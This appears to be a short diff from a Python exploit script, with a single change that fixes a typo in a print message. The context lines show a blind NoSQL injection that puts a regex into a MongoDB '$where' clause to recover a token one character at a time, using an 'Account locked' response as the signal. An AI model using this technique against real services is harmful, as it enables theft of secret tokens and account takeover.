@@ -24,7 +24,7 @@ def brute_force_char_at_idx(input_data):
         payload['$where'] = f"this.{field_name}.match(/^{'.' * idx}{c}.*$/)"
         resp = requests.post(url, headers=headers, json=payload)
         if 'Account locked' in resp.text:
-            print(f'Found toekn {idx+1}° char: {c}')
+            print(f'Found token {idx+1}° char: {c}')
             return (idx, c)
     return (idx, None)
 
